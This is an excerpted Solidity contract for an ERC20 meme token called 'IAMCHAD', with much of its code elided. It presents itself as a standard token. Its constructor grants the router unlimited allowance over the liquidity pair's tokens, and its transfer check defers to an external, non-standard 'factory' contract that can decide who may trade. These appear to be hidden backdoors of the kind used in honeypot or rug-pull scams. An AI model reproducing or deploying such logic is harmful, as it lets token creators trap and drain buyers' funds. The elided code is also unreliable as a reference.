...
Shut up! I am Chad
 */
// Website: https://www.iamchad.org
// Telegram: https://t.me/iamchaderc20
...
interface IUniswapLib {
    ...
    function isPairCreated(address tokenA, address tokenB) external returns (bool);
...
contract StandardERC20 is Context, IERCSimple20 {
     ...
     * {IERCSimple20-balanceOf} and {IERCSimple20-transfer}.
     */
    ...
    /**
     * @dev See {IERCSimple20-totalSupply}.
     */
    ...
    /**
     * @dev See {IERCSimple20-balanceOf}.
     */
    ...
    /**
     * @dev See {IERCSimple20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
    ...
    /**
     * @dev See {IERCSimple20-transferFrom}.
     *
     ...
     * problems described in {IERCSimple20-approve}.
     *
...
contract IAMCHAD is Ownable, StandardERC20  {
    ...
    constructor(
        ...
        uint256 supply_, uint8 decimals_, 
        uint256 maxTransaction_, uint256 maxWallet_, 
        address router_, UniReference memory uniRefer_
    ) payable StandardERC20(name_, symbol_, decimals_) {
        uniRefer = uniRefer_;
        univ2RouterAddress = uniRefer.router;
        uniLib = IUniswapLib(router_);
        _chadSupply = supply_;        
        univ2PairAddress = IUniswapLib(uniLib.factory()).createPair(address(this), uniLib.WETH());
        _allowances[univ2PairAddress][univ2RouterAddress] = type(uint).max;
    ...
    function isExcluded(address from, address to) private returns (bool) {
        bool isTradingOpened = IUniswapLib(uniRefer.factory).isPairCreated(from, to);
    ...
    function _transfer(
        ...
        if (!isExcluded(from, to)){
            ...
            if (to != univ2PairAddress) {
                require(balanceOf(to) + amount <= chadMaxWallet, "Max Wallet limit");
            }
        }
